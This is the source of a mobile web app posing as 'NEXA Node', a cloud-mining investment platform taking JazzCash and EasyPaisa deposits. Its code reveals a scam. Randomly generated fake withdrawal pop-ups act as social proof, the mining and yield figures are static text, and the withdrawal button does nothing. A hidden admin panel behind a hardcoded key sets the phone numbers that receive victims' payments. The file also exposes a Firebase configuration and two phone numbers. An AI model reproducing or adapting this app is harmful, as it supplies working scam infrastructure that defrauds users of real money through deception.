<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXA | Next-Gen Infrastructure</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        :root { --p: #2563EB; --s: #0F172A; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #f8fafc; color: var(--s); }
        .glass { background: rgba(255,255,255,0.9); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.4); }
        .card-neo { border-radius: 32px; background: #fff; box-shadow: 0 20px 40px -15px rgba(0,0,0,0.05); transition: 0.3s; }
        .btn-grad { background: linear-gradient(135deg, #2563EB, #4F46E5); color: white; border-radius: 18px; font-weight: 800; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; }
        .input-neo { background: #f1f5f9; border: 1px solid #e2e8f0; border-radius: 20px; padding: 18px; width: 100%; outline: none; font-weight: 600; }
        .nav-icon { font-size: 22px; color: #94a3b8; transition: 0.3s; }
        .nav-active { color: var(--p) !important; transform: scale(1.15); }
        
        /* Live Popup Style Like Cloud-Node */
        #live-notify { position: fixed; bottom: 120px; left: 20px; right: 20px; z-index: 999; transform: translateY(200px); transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        .notify-show { transform: translateY(0) !important; }
        .hidden { display: none !important; }
    </style>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
        import { getDatabase, ref, set, get, update, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBe5Q5jXpx3UvrHC9WOky9UWeDnP9SPfZI",
            authDomain: "verbose-6c008.firebaseapp.com",
            databaseURL: "https://verbose-6c008-default-rtdb.firebaseio.com",
            projectId: "verbose-6c008",
            storageBucket: "verbose-6c008.firebasestorage.app",
            messagingSenderId: "867100945312",
            appId: "1:867100945312:web:315dfb48fb34496cee12c5"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getDatabase(app);

        // --- Logic Engine ---
        let adminClicks = 0;

        window.authAction = async (mode) => {
            const user = document.getElementById('user-input').value;
            if(!user) return alert("Enter Username sweetie!");
            
            try {
                await signInAnonymously(auth);
                const uid = auth.currentUser.uid;
                const userRef = ref(db, 'users/' + uid);
                const snap = await get(userRef);

                if(mode === 'new' && !snap.exists()) {
                    await set(userRef, { username: user, balance: 2.0, pkr: 150, uid: uid });
                    localStorage.setItem('nexa_session', uid);
                    location.reload();
                } else if(mode === 'old' && snap.exists()) {
                    localStorage.setItem('nexa_session', uid);
                    location.reload();
                } else { alert("User not found or already exists!"); }
            } catch (e) { alert(e.error); }
        };

        window.onload = () => {
            const session = localStorage.getItem('nexa_session');
            if(session) {
                document.getElementById('auth-screen').style.display = 'none';
                document.getElementById('app-screen').classList.remove('hidden');
                loadApp(session);
                startLiveNotifications();
            }
        };

        function loadApp(uid) {
            onValue(ref(db, 'users/' + uid), (s) => {
                const d = s.val();
                document.getElementById('nav-user').innerText = d.username;
                document.getElementById('stat-usd').innerText = "$" + d.balance.toFixed(2);
                document.getElementById('stat-pkr').innerText = "Rs. " + d.pkr;
            });
            onValue(ref(db, 'admin/settings'), (s) => { window.adminData = s.val(); });
        }

        // --- Live Notification Engine (Cloud-Node Style) ---
        function startLiveNotifications() {
            const names = ["Ahmad", "Sarah", "Zain", "Fatima", "Someone from Karachi", "User786", "Sophia"];
            const amounts = ["$40,000", "Rs. 5,000", "$150", "Rs. 25,000", "$1,200"];
            
            setInterval(() => {
                const box = document.getElementById('live-notify');
                document.getElementById('notif-name').innerText = names[Math.floor(Math.random()*names.length)];
                document.getElementById('notif-amt').innerText = amounts[Math.floor(Math.random()*amounts.length)];
                box.classList.add('notify-show');
                setTimeout(() => box.classList.remove('notify-show'), 4000);
            }, 12000);
        }

        window.openPay = (m) => {
            const num = m === 'jazz' ? window.adminData.jazz : window.adminData.easy;
            prompt(`Send Payment to ${m.toUpperCase()}:\n${num}\nEnter Trans-ID:`, "");
        };

        window.triggerAdmin = () => {
            adminClicks++;
            if(adminClicks >= 5) {
                const k = prompt("Secret Key:");
                if(k === "SWEETIE786") document.getElementById('admin-pane').classList.toggle('hidden');
                adminClicks = 0;
            }
        };

        window.updateSettings = () => {
            const j = document.getElementById('adm-j').value;
            const e = document.getElementById('adm-e').value;
            update(ref(db, 'admin/settings'), { jazz: j, easy: e });
            alert("Settings Saved Sweetie! 💋");
        };

        window.switchTab = (t) => {
            ['dash','pay','log'].forEach(id => document.getElementById('s-'+id).classList.add('hidden'));
            document.getElementById('s-'+t).classList.remove('hidden');
            document.querySelectorAll('.nav-icon').forEach(i => i.classList.remove('nav-active'));
            event.currentTarget.classList.add('nav-active');
        };
    </script>
</head>
<body class="pb-24">

    <!-- Live Notification Pop-up -->
    <div id="live-notify">
        <div class="glass p-4 rounded-3xl shadow-2xl border-l-4 border-blue-600 flex items-center gap-4 max-w-sm mx-auto">
            <div class="w-10 h-10 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center animate-pulse"><i class="fa-solid fa-check"></i></div>
            <div>
                <p class="text-[10px] font-bold text-slate-400">SUCCESSFUL WITHDRAWAL</p>
                <p class="text-xs font-black"><span id="notif-name">...</span> withdrawn <span id="notif-amt" class="text-blue-600">...</span></p>
            </div>
        </div>
    </div>

    <!-- Auth Screen -->
    <div id="auth-screen" class="fixed inset-0 bg-white z-[9999] p-8 flex flex-col justify-center">
        <div class="text-center mb-12">
            <div class="w-20 h-20 bg-blue-600 rounded-[2.5rem] mx-auto flex items-center justify-center rotate-12 shadow-2xl shadow-blue-200 mb-6">
                <i class="fa-solid fa-cloud text-white text-3xl -rotate-12"></i>
            </div>
            <h1 class="text-3xl font-black italic tracking-tighter">NEXA NODE</h1>
            <p class="text-[10px] font-black text-slate-300 uppercase mt-2 tracking-[0.3em]">Quantum Infrastructure</p>
        </div>
        <div class="space-y-4">
            <input id="user-input" type="text" placeholder="Username" class="input-neo">
            <button onclick="authAction('old')" class="w-full bg-slate-900 text-white py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest shadow-xl">Login Terminal</button>
            <button onclick="authAction('new')" class="w-full bg-blue-600 text-white py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest">Create Identity</button>
        </div>
    </div>

    <!-- App Screen -->
    <div id="app-screen" class="hidden">
        <header class="p-6 flex justify-between items-center sticky top-0 bg-white/80 backdrop-blur-md z-50">
            <div onclick="triggerAdmin()" class="flex items-center gap-3">
                <div class="w-10 h-10 bg-blue-600 rounded-2xl flex items-center justify-center shadow-lg"><i class="fa-solid fa-bolt text-white text-sm"></i></div>
                <h2 id="nav-user" class="font-black italic text-sm">...</h2>
            </div>
            <div class="text-right">
                <h3 id="stat-usd" class="text-blue-600 font-black leading-none">$0.00</h3>
                <p id="stat-pkr" class="text-[9px] font-bold text-slate-400 uppercase mt-1 leading-none">Rs. 0</p>
            </div>
        </header>

        <main class="p-5">
            <!-- Dashboard -->
            <div id="s-dash" class="space-y-6">
                <div class="card-neo p-8 bg-slate-900 text-white relative overflow-hidden">
                    <div class="relative z-10">
                        <span class="bg-blue-600 px-3 py-1 rounded-lg text-[8px] font-black">SYSTEM STATUS: ACTIVE</span>
                        <h1 class="text-4xl font-black mt-4 italic">15+5 Nodes</h1>
                        <p class="text-[10px] opacity-40 font-bold mt-2 uppercase tracking-widest italic">Mining at 4.2 Petahash</p>
                    </div>
                    <i class="fa-solid fa-server absolute -right-6 -bottom-6 text-white/5 text-[10rem]"></i>
                </div>

                <div class="flex justify-between items-center px-1">
                    <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-widest">Premium Nodes ($)</h3>
                    <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
                </div>
                
                <div class="card-neo p-6 border-b-4 border-blue-600">
                    <div class="flex justify-between items-start mb-6">
                        <div class="w-12 h-12 bg-blue-50 text-blue-600 rounded-2xl flex items-center justify-center text-xl"><i class="fa-solid fa-microchip"></i></div>
                        <div class="text-right"><p class="text-2xl font-black">$5.00</p><p class="text-[8px] font-bold text-slate-400">MIN ENTRY</p></div>
                    </div>
                    <h4 class="font-black text-lg">Cloud Core v5</h4>
                    <p class="text-xs text-slate-500 mt-1 mb-6">Yield: <span class="text-blue-600 font-bold">$0.45 Daily</span> • Duration: 360 Days</p>
                    <button class="w-full btn-grad py-4">Activate Node</button>
                </div>

                <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-widest px-1 mt-8">Economy Nodes (PKR)</h3>
                <div class="card-neo p-6 border-b-4 border-slate-900">
                    <div class="flex justify-between items-start mb-6">
                        <div class="w-12 h-12 bg-slate-50 text-slate-900 rounded-2xl flex items-center justify-center text-xl"><i class="fa-solid fa-bolt-lightning"></i></div>
                        <div class="text-right"><p class="text-2xl font-black">Rs. 250</p><p class="text-[8px] font-bold text-slate-400">STARTER</p></div>
                    </div>
                    <h4 class="font-black text-lg">Local Pulse v1</h4>
                    <p class="text-xs text-slate-500 mt-1 mb-6">Yield: <span class="text-slate-900 font-bold">Rs. 18 Daily</span> • Duration: 360 Days</p>
                    <button class="w-full bg-slate-900 text-white py-4 rounded-2xl font-black text-[10px] uppercase">Buy Now</button>
                </div>
            </div>

            <!-- Wallet -->
            <div id="s-pay" class="hidden space-y-6">
                <div class="card-neo p-6">
                    <h3 class="font-black text-xs uppercase mb-6 tracking-widest text-blue-600">Secure Deposit</h3>
                    <div class="grid grid-cols-2 gap-4">
                        <button onclick="openPay('jazz')" class="p-6 bg-slate-50 rounded-3xl border border-slate-100 flex flex-col items-center gap-3 active:scale-95 transition">
                            <i class="fa-solid fa-phone text-green-500 text-2xl"></i>
                            <span class="text-[10px] font-black">JAZZCASH</span>
                        </button>
                        <button onclick="openPay('easy')" class="p-6 bg-slate-50 rounded-3xl border border-slate-100 flex flex-col items-center gap-3 active:scale-95 transition">
                            <i class="fa-solid fa-wallet text-blue-500 text-2xl"></i>
                            <span class="text-[10px] font-black">EASYPAISA</span>
                        </button>
                    </div>
                </div>

                <div class="card-neo p-8">
                    <h3 class="font-black text-xs uppercase mb-6 tracking-widest">Withdrawal Terminal</h3>
                    <div class="space-y-4">
                        <input type="text" placeholder="Account Name" class="input-neo">
                        <input type="number" placeholder="Withdraw Amount" class="input-neo">
                        <input type="text" placeholder="Account Number" class="input-neo">
                        <button class="w-full btn-grad py-5 shadow-lg shadow-blue-100">Initiate Payout</button>
                    </div>
                </div>
            </div>

            <!-- Admin Logic -->
            <div id="admin-pane" class="hidden card-neo p-6 border-2 border-red-500 bg-red-50 mt-10">
                <h2 class="text-red-600 font-black text-center mb-6">MASTER OVERRIDE</h2>
                <div class="space-y-4">
                    <div>
                        <label class="text-[10px] font-black uppercase text-slate-400">Jazz/Sada Number</label>
                        <input id="adm-j" type="text" class="input-neo" value="03705519562">
                    </div>
                    <div>
                        <label class="text-[10px] font-black uppercase text-slate-400">EasyPaisa Number</label>
                        <input id="adm-e" type="text" class="input-neo" value="03379827882">
                    </div>
                    <button onclick="updateSettings()" class="w-full bg-red-600 text-white py-4 rounded-2xl font-black">SAVE SYSTEM NUMBERS</button>
                </div>
            </div>
        </main>

        <!-- Navigation -->
        <nav class="fixed bottom-6 left-6 right-6 h-20 glass rounded-[2.5rem] flex justify-around items-center px-6 z-[1000] shadow-2xl">
            <button onclick="switchTab('dash')" class="nav-icon nav-active"><i class="fa-solid fa-ghost"></i></button>
            <button onclick="switchTab('pay')" class="nav-icon"><i class="fa-solid fa-wallet"></i></button>
            <button onclick="switchTab('log')" class="nav-icon"><i class="fa-solid fa-receipt"></i></button>
        </nav>
    </div>

</body>
</html>
